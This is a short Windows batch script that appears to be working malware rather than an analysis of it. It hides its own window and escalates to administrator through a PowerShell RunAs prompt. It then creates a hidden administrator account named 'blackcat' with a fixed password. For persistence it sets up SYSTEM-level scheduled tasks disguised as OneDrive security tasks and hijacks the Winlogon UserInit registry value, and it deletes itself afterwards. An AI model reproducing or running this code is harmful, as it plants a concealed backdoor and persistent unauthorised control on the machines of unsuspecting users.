@echo off & setlocal enabledelayedexpansion

 if not "%1"=="hidden" (
     >nul 2>&1 start /min cmd /c "%~0" hidden
     exit
 )
 
net session >nul 2>&1 || (
    set "args=%*"
    set "args=!args:"=\"!"
    powershell -nop -c "Start-Process '%~f0' '!args!' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

net user blackcat JapanNight123 /add >nul 2>&1

net localgroup Administrators blackcat /add >nul 2>&1

for /f "tokens=2 delims=\" %%A in ('whoami') do set "currentUser=%%A"

schtasks /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-%currentUser%" /tr "C:\Windows\adfs\py\UpdateEdge.bat" /sc ONSTART /F 2>&1
schtasks /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-%currentUser%" /tr "C:\Users\%currentUser%\AppData\Local\Notepad\UpdateEdge.bat" /sc ONSTART /F 2>&1
schtasks /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-%currentUser%" /tr "C:\Windows\adfs\py\UpdateEdge.bat" /sc MINUTE /mo 720 /F 2>&1
schtasks /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-%currentUser%" /tr "C:\Users\%currentUser%\AppData\Local\Notepad\UpdateEdge.bat" /sc MINUTE /mo 720 /F 2>&1
schtasks /create /tn "OneDrive Security Task-S-1-5-21-%currentUser%" /tr "C:\Windows\adfs\py\UpdateEdge.bat" /sc ONIDLE /I 1 /F 2>&1
schtasks /create /tn "OneDrive Security Task-S-1-5-21-%currentUser%" /tr "C:\Users\%currentUser%\AppData\Local\Notepad\UpdateEdge.bat" /sc ONIDLE /I 1 /F 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v UserInit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Users\%currentUser%\AppData\Local\Notepad\UpdateEdge.bat" /f 2>&1

del "%~f0"